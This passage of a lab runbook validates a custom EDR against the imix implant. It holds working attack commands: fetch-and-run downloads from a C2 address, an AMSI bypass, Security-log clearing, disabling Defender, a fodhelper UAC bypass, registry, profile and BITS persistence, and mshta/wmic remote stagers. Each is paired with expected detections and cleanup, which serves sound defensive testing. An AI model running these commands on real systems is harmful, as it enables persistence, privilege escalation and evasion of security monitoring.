Set-ItemProperty "HKCU:\Control Panel\Desktop" -Name SCRNSAVE.EXE -Value "C:\Users\Public\sysupd.exe"
Set-ItemProperty "HKCU:\Control Panel\Desktop" -Name ScreenSaveTimeout -Value 60
Set-ItemProperty "HKCU:\Control Panel\Desktop" -Name ScreenSaveActive -Value 1
```

**Expected:** `PERS-SCREENSAVER` (high) on the next audit cycle (diff against baseline —
the value didn't point at a user path at T0). If the screensaver actually engages, the
implant launch chain (`EVT-4688-TEMP` + `PROG-IMPLANT-LAUNCH`) fires too.

**Winlogon Shell hijack (HKLM — test with caution):** the auditor baselines
`Shell`/`Userinit`; *changing* `Shell` on a live server risks a broken logon if you sign
out mid-test. For a safe verification, change it and change it back in the same session:

```powershell
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value "explorer.exe, C:\Users\Public\sysupd.exe"
# confirm PERS-WINLOGON (critical) fired, then restore immediately:
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value "explorer.exe"
# and take a fresh baseline afterwards
```

### 5.9 ADVANCED — PowerShell profile hijack (T1546.013) ⚡

**The technique:** backdoor the profile script that runs automatically in *every*
interactive PowerShell — your own analysts carry the implant in.

**Manual PoC (VICTIM shell):**

```powershell
New-Item -ItemType Directory -Force "$env:USERPROFILE\Documents\WindowsPowerShell" | Out-Null
Set-Content "$env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" `
  -Value 'Start-Process C:\Users\Public\sysupd.exe -WindowStyle Hidden'
# then open a NEW PowerShell window - the profile fires, the implant launches
```

**Expected:** `PERS-PSPROFILE` (high) when the profile file appears (auditor checks all
four standard profile locations); on the next shell open, the launch chain fires on the
implant. Cleanup: delete the profile file.

### 5.10 ADVANCED — BITS job persistence (T1197) ⚡

**The technique:** create a Background Intelligent Transfer job with a `SetNotifyCmdLine`
callback — `svchost`-hosted, survives reboots until completed, and the notify command runs
as SYSTEM. References: [MITRE T1197](https://attack.mitre.org/techniques/T1197/),
[ired.team BITS persistence](https://www.ired.team/offensive-security/persistence/t1197-bits-jobs),
[Elastic's NotifyCmdLine detection](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/persistence_via_bits_job_notify_command).

**Manual PoC (VICTIM shell, elevated) — verified live:**

```powershell
bitsadmin /create CCDCTestJob
bitsadmin /addfile CCDCTestJob http://172.16.69.109:8000/imix.exe C:\Users\Public\sysupd.exe
# (job stays queued = the persistence primitive; the real attack adds SetNotifyCmdLine
#  via the raw COM interface so svchost runs your command when the job state changes)
```

**Expected:** `PERS-BITS` (high) — the auditor enumerates BITS jobs via `bitsadmin /list`
every cycle (verified live on this machine: `bitsadmin /create` + `/addfile` alerted within
one audit cycle). Note: an *empty* suspended job gets reaped when its console session exits —
the queued `/addfile` is what makes it persist. Cleanup: `bitsadmin /cancel CCDCTestJob`.

### 5.11 ADVANCED — Silent Process Exit / IFEO GlobalFlag (very advanced)

Hijack a process ***exit*** instead of its launch: `GlobalFlag=512` on a target in IFEO +
a `SilentProcessExit\MonitorProcess` payload — fires every time a legit binary (notepad)
closes. **Expected:** payload launch fires the standard chain; the *arming* is a **GAP**
(auditor reads only IFEO's `Debugger` value). Full steps:
[`../../custom-walkthrough/persistence-silentprocessexit/`](../../custom-walkthrough/persistence-silentprocessexit/WALKTHROUGH.md).
Cleanup: delete the created IFEO key.

### 5.12 ADVANCED — Hidden local account

`net user cdcbackup$ ... /add` — the `$`-suffixed account vanishes from `net user` while
staying fully usable. **Expected:** `EVT-4720` + `EVT-4732` (both channels already
consumed) catch creation and admin-group insertion regardless of the hidden name;
registry-direct SAM insertion (no 4720) is a **GAP** — file a local-account baseline
audit. Full steps:
[`../../custom-walkthrough/persistence-hidden-user/`](../../custom-walkthrough/persistence-hidden-user/WALKTHROUGH.md).
Cleanup: `net user cdcbackup$ /delete`.


---

## Phase 6 — Advanced evasion & anti-tamper battery (manual, per technique)

Each subsection is a standalone test: run it with Tavern still up on **172.16.69.109** and
the EDR running, check for the expected alert, then clean up. Techniques are ordered by
CCDC likelihood. Full research context lives in `advanced-evasion-test-catalog.md`; this
phase is the executable version, wired to your Realm setup.

### 6.1 AMSI bypass, then cradle the real implant ⚡

The realistic chain: blind AMSI *inside* a PowerShell session, then pull imix from Tavern —
the download the platform was supposed to inspect happens blind.

From an elevated PowerShell on VICTIM:

```powershell
# 1. blind AMSI (public, benign one-liner)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`
  .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# 2. now deliver the implant the way a red team would
IWR http://172.16.69.109:8000/imix.exe -OutFile $env:TEMP\sysupd.exe
& $env:TEMP\sysupd.exe
```

**Expected:** `PROC-NOPS-AMSI` fires only if the bypass rides the *command line* — this one
runs in a script block, so your real tripwire is **PowerShell 4104 script-block logging**
(verify an event containing `amsiInitFailed` arrived; enable with
`Set-ItemProperty HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell -Name
ScriptBlockLogging -Value 1` if silent). The download + launch then trip
`SIG-REALM-IMIX`/`SIG-RUST-IMPLANT` on write and `EVT-4688-TEMP` +
`PROG-IMPLANT-LAUNCH` at launch regardless — your EDR doesn't depend on AMSI, so the
chain is still caught. **Improvement to file:** content rules over 4104 blocks.

### 6.2 Security-log clearing ⚡

```powershell
wevtutil cl Security
```

**Expected:** `TAMPER-AUDIT` (critical) via the 1102 clear record. If it doesn't raise,
the eventlog bookmark swallowed the record — that's a consumer bug, fix it first.

### 6.3 Defender exclusion + real-time-monitoring tamper ⚡

```powershell
Add-MpPreference -ExclusionPath C:\Users\Public
# and the harder variant:
Set-MpPreference -DisableRealtimeMonitoring $true
```

**Expected:** `TAMPER-DEFENDER` (high) on the first. The second cmdlet is a **GAP** — no
rule keys on it; add `set-mppreference.*disable` to the same regex. Cleanup:
`Remove-MpPreference -ExclusionPath C:\Users\Public` and re-enable RTP.

### 6.4 Masqueraded implant — fake `svchost.exe` ⚡

Rename implant A to a system-binary name in a user dir and run it:

```powershell
Copy-Item \\172.16.69.109\share\imix.exe C:\Users\Public\svchost.exe
& C:\Users\Public\svchost.exe
```

**Expected:** `EVT-4688-TEMP` (high) — catches it by *path*, which survives the rename.
`SIG-REALM-IMIX` still fires on the bytes (renaming changes nothing statically), and
`NET-BEACON` follows once it callbacks to 172.16.69.109. **Improvement to file:** a named
`PROC-MASQ` rule (name ∈ svchost/lsass/csrss/winlogon AND path not under `\Windows\` →
critical) so the console says what actually happened.

### 6.5 Injection family via Atomic Red Team 🔧

Waits the same launcher-side detections as Phase 4.7 but exercises each injection variant.
On VICTIM (elevated), with [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
installed:

```powershell
Import-Module .\invoke-atomicredteam.ps1
Invoke-AtomicTest T1055.003   # thread hijacking
Invoke-AtomicTest T1055.004   # APC queue injection
Invoke-AtomicTest T1055.011   # section-view injection
Invoke-AtomicTest T1055.012 -TestNumbers 1   # hollowing (same as 4.7)
Invoke-AtomicTest T1055.003 -Cleanup; Invoke-AtomicTest T1055.004 -Cleanup
```

**Expected today:** process telemetry for the PowerShell host (and `PROC-ENC-PS` when the
atomic encodes its command); the injection acts themselves are **GAP** — no Sysmon.
**The fix that unlocks this whole family:** install Sysmon (SwiftOnSecurity-style config);
your eventlog sensor already consumes `Microsoft-Windows-Sysmon/Operational` — add rules
over **EID 8 (CreateRemoteThread), EID 10 (ProcessAccess, esp. lsass targets), EID 25
(ProcessTampering)** and every test above turns into a critical alert.

### 6.6 PPID-spoofed implant launch 🔧

On ATTACKER, add a 30-line launcher (Rust or C#: `UpdateProcThreadAttribute` with
`PROC_THREAD_ATTRIBUTE_PARENTSPOOFING`) that spawns `sysupd.exe` claiming `explorer.exe`
or `svchost.exe` as parent. Deliver and run it on VICTIM.

**Expected:** your process sensor records the *spoofed* PPID (WMI reports the attribute),
so parent-child rules can be evaded by a well-chosen fake parent — the launch itself still
hits `EVT-4688-TEMP`/`PROG-IMPLANT-LAUNCH` by path. **Detection that defeats the spoof at
your fidelity:** on each new process, resolve the PPID — dead or recycled parent → anomaly.
**File as backlog:** `PROC-DEAD-PARENT` (high).

### 6.8 ADVANCED — fodhelper UAC bypass → elevated implant launch (T1548.002) ⚡

**The technique:** write an HKCU proxy for the `ms-settings` protocol, launch the signed
auto-elevate `fodhelper.exe`, and your command runs elevated with zero UAC prompt — the
classic prelude to implant/service install from a medium-integrity shell. Reference:
[Elastic Security Labs — Exploring Windows UAC
Bypasses](https://www.elastic.co/security-labs/threat-command/exploring-windows-uac-bypasses-techniques-and-detection-strategies).

**Manual PoC (VICTIM, a *non-elevated* PowerShell — that's the point):**

```powershell
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" `
  -Value "C:\Users\Public\sysupd.exe"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name DelegateExecute -Value ""
Start-Process C:\Windows\System32\fodhelper.exe     # elevated implant launch, no prompt
```

**Expected:** `PERS-UAC-KEY` (critical) — the auditor now inventories the ms-settings
proxy key and this exact write is its highest-signal catch; the fodhelper launch itself
appears in process telemetry (`EVT-4688` chain); if the implant runs, the full
`PROG-IMPLANT-LAUNCH` + `NET-BEACON` chain follows. Cleanup: remove the
`HKCU:\Software\Classes\ms-settings` tree.

### 6.9 Script-host LOLBIN launchers ⚡

The launch methods that dodge the PowerShell rules entirely:

```powershell
# mshta running a remote-ish HTA (stage a benign .hta on the share first)
mshta \\172.16.69.109\share\stager.hta
# wscript running a staged VBS
wscript C:\Users\Public\stager.vbs
# wmic remote-format abuse (classic Cobalt Strike stager pattern)
wmic /format:"http://172.16.69.109:8000/x.xsl"
```

**Expected:** `PROC-SCRIPTHOST` (high) on each — the new rule keys on script-host command
lines carrying remote or user-profile content, plus `EVT-4688-TEMP` for anything launched
from user paths.

### 6.10 ADVANCED — UAC bypass family (fodhelper's siblings)

`computerdefaults.exe` (same ms-settings key → `PERS-UAC-KEY` fires), `eventvwr.exe`
(`mscfile` proxy key → **GAP**), `sdclt.exe` (`exefile` key → **GAP**). Elevated payload
launches still trip the standard chain in all three cases. Full steps:
[`../../custom-walkthrough/privesc-uac-family/`](../../custom-walkthrough/privesc-uac-family/WALKTHROUGH.md).

### 6.11 ADVANCED — Service misconfiguration privesc

Unquoted service paths (plant `C:\Users\Public\My.exe` to win resolution of
`C:\Users\Public\My Tools\svc.exe`) and `AlwaysInstallElevated` MSI-as-SYSTEM. The
service install fires `EVT-7045`/`PERS-SERVICE`; the unquoted-path *condition* and the
Installer policy keys are **GAPS** (pure enumeration fixes for the auditor). Full steps:
[`../../custom-walkthrough/privesc-service-misconfig/`](../../custom-walkthrough/privesc-service-misconfig/WALKTHROUGH.md).

### 6.12 VERY ADVANCED — Process ghosting / herpaderping

Execution races that defeat on-disk scanning: ghosting executes from a delete-pending
file; herpaderping swaps on-disk content after the image is mapped. Tested with the
public [Herpadering PoC](https://github.com/jthuraisamy/Herpadering). **Verdict:** they
defeat static file verification, not process visibility — launch-path rules still fire;
full closure needs Sysmon EID 1 creation-time hashing. Full steps:
[`../../custom-walkthrough/evasion-process-ghosting/`](../../custom-walkthrough/evasion-process-ghosting/WALKTHROUGH.md).

### 6.13 VERY ADVANCED — Sleep obfuscation (in-memory encryption)

The implant encrypts its memory every sleep callback (Havoc Demon / CS Sleep Mask / Ekko).
Tested with the benign [C5pider/Ekko](https://github.com/C5pider/Ekko) PoC. **Verdict:**
you catch the container (SIG on write, launch chain before the first sleep) but not the
technique — no memory scanning exists; the sleep/wake-transition scanner from the research
guide §4 is the fix. Full steps:
[`../../custom-walkthrough/evasion-sleep-obfuscation/`](../../custom-walkthrough/evasion-sleep-obfuscation/WALKTHROUGH.md).

### 6.14 C2 channel — named-pipe beacons (Cobalt Strike SMB pivot)

CS beacons chain peer-to-peer over named pipes (`msagent_*` defaults) — zero egress. The
test hosts a benign `msagent_ccdc01` pipe. **GAP:** no runtime pipe enumeration; static
`SIG-CS-BEACON` knows the names but says nothing about live pipes. Fix: a
`\\.\pipe\` enumeration cycle + baseline diff + known-bad patterns → highest-value
network-side fix available. Full steps:
[`../../custom-walkthrough/c2-named-pipes/`](../../custom-walkthrough/c2-named-pipes/WALKTHROUGH.md).

### 6.7 Telemetry-blinding techniques — expected N/A, verify the architecture holds

Run any benign SysWhispers-style demo or ntdll re-mapping PoC on VICTIM. Direct/indirect
syscalls, unhooking, and user-mode ETW patching all attack *hook-based* EDRs — your EDR
hooks nothing, and its telemetry rides kernel-fed channels (Security/System logs, the NT
Kernel Logger session) that userland code cannot patch. **Expected:** process/launch/network
telemetry unaffected; nothing to "catch" because nothing was blinded. Re-run this phase the
day you add userland hooks — these flip to critical. **Do not** test BYOVD on this box; a
successful kernel-driver abuse is a real compromise, out of lab scope.

---

## Phase 7 — EDR's own telemetry as the scoreboard

After the full run, pull the story from the API and paste it into your notes:

```bash
curl -s http://127.0.0.1:8420/api/state > post-run.json
python -c "
import json; s=json.load(open('post-run.json'))
from collections import Counter
c=Counter(a['rule'] for a in s['alerts'])
[print(f'{n:4d}  {r}') for r,n in sorted(c.items())]"
```

Cross-check against this table — every row should be ≥1:

| Rule | Exercised by |
|---|---|
| SIG-REALM-IMIX, SIG-RUST-IMPLANT | every delivery (3.x) and write of A–G |
| PROC-ENC-PS, EVT-4688-SUSP | 3.1 encoded cradle |
| EVT-4688-TEMP, PROG-IMPLANT-LAUNCH | every launch from %TEMP%/Public (3.3, 4.x, 5.2 task firing, 5.5 WMI firing) |
| PROC-LOLBIN-DOWNLOAD | 3.1 certutil/bitsadmin variation |
| NET-BEACON | 4.1, 4.2, 4.4, 5.1 service beaconing |
| PERS-SERVICE, EVT-7045 | 5.1 |
| PERS-TASK, EVT-4698 | 5.2 |
| PERS-RUNKEY | 5.3 |
| PERS-STARTUP | 5.4 |
| PERS-WMI-SUB | 5.5 |
| SIG-ELDRITCH-TOME | 5.6 (if the install writes a tome file) |
| PROC-SUSP-PARENT | 4.7 / 6.5 hollowing (parent-pair dependent — verify) |
| EVT-DEFENDER-SIDELOAD / PROC-DEFENDER-SIDELOAD | 4.8 Defender binary run from a non-default path |
| PERS-COM | 5.7 COM hijack (also collected automatically) |
| PERS-SCREENSAVER / PERS-WINLOGON | 5.8 |
| PERS-PSPROFILE | 5.9 |
| PERS-BITS | 5.10 |
| PERS-UAC-KEY | 6.8 fodhelper ms-settings proxy |
| PROC-SCRIPTHOST | 6.9 mshta/wscript/wmic launchers |
| PROC-NOPS-AMSI | 6.1 (only if the bypass rides the command line) |
| TAMPER-AUDIT | 6.2 Security-log clear |
| TAMPER-DEFENDER | 6.3 Defender exclusion |

**Known gaps you should expect to see miss** (pre-filed, treat as backlog):
`tcp_bind` network detection (4.5), DNS/ICMP transports (not in this run — add builds H/I if
you extend), memory scanning (image scanning only), **module-load telemetry for unsigned
DLLs in signed processes (4.6 sideloading — earliest tripwire today is the on-write file
scan)**, **RWX/remote-write injection telemetry (4.7 / 6.5 — needs Sysmon EID 8/10 or a
Thread start-address check)**, **`Set-MpPreference -DisableRealtimeMonitoring` (6.3 — add
to TAMPER-DEFENDER regex)**, **in-script AMSI bypasses (6.1 — needs 4104 content rules)**,
and **PPID spoofing consistency (6.6 — needs the `PROC-DEAD-PARENT` check)**.
Phase 5.11-5.12 / 6.10-6.14 / Phase 9 gaps (filed with each walkthrough): **IFEO
GlobalFlag/SilentProcessExit arming (5.11)**, **registry-inserted hidden accounts (5.12)**,
**mscfile/exefile UAC proxy keys (6.10)**, **unquoted service paths +
AlwaysInstallElevated (6.11)**, **ghosting/herpaderping file↔process mismatch (6.12 —
needs Sysmon EID 1 hashing)**, **sleep-obfuscation memory scanning (6.13 — needs the
sleep/wake scanner)**, **live named-pipe enumeration (6.14)**, and the Phase 9 lateral
channels **4648 / 4769-RC4 / 5145 / 4624-NTLM / PSEXESVC / wsmprovhost**.

## Phase 8 — Full cleanup

1. Stop/kill any resident implants (`Stop-Process -Name sysupd,imix* -Force`)
2. Remove all persistence: service (5.1), task (5.2), run key (5.3), startup file (5.4),
   WMI subscription objects (5.5)
3. Delete delivered binaries from `%TEMP%` and `C:\Users\Public`
4. Phase 6 residue: remove any Defender exclusions, re-enable real-time protection if you
   disabled it in 6.3, confirm `Invoke-AtomicTest ... -Cleanup` ran for 6.5
5. `curl -X POST http://127.0.0.1:8420/api/baseline` — fresh T0 snapshot
6. Confirm one clean audit cycle (no new PERS-* alerts for 60s)
7. Stop Tavern and the HTTP server on ATTACKER

## Phase 9 — Lateral movement battery (two-machine / domain required)

The whole lateral-movement category, run as its own session. Walkthroughs with full
manual steps live in `custom-walkthrough/`:

| Test | Chain | Walkthrough |
|---|---|---|
| **PsExec chain** | ADMIN$ write (5145) → `PSEXESVC` service (7045) → payload | [`lateral-psexec-chain/`](../../custom-walkthrough/lateral-psexec-chain/WALKTHROUGH.md) |
| **WinRM/PSRemoting** | 4648 explicit creds → `wsmprovhost.exe` session host → cradle in-session | [`lateral-winrm/`](../../custom-walkthrough/lateral-winrm/WALKTHROUGH.md) |
| **Kerberoasting / PtH** | 4769 RC4 TGS requests; 4624 LogonType 3 NTLM replay | [`privesc-kerberoast-pth/`](../../custom-walkthrough/privesc-kerberoast-pth/WALKTHROUGH.md) |

**State of coverage, honestly:** the strongest lateral signal you already have is
`EVT-7045` (any remote service install — PsExec included). Everything else in this
phase is a **filed gap**: 5145 share writes, 4648 explicit credentials, 4624
network-logon correlation (noisy — needs NTLM + non-machine-account filtering), 4769
RC4 Kerberos tickets, and a `wsmprovhost`/`PSEXESVC` process-rule pair. Kerberoast/PtH
additionally need a domain-joined lab. These are the detection-engineering backlog
for the next build cycle, ordered: 4648 → 4769(RC4-filtered) → PSEXESVC name rule →
5145(ADMIN$/IPC$-filtered) → 4624(filtered) → wsmprovhost rule.

Cleanup per test is documented inside each walkthrough.

## Extending the run later

- **Build H (DNS TXT) / I (ICMP):** add `IMIX_CONFIG` YAML variants; these exercise the two
  known network-sensor gaps and give you the test corpus for closing them
- **Cross-host:** point a second victim at the same Tavern and use imix's SOCKS5/reverse
  shell tomes over gRPC — that fans out connections from one process and is the natural test
  for per-process connection-count detection
- **Regression corpus:** keep builds A–G with their exact compile flags; any rule change
  should be re-verified against the frozen binaries before you trust it
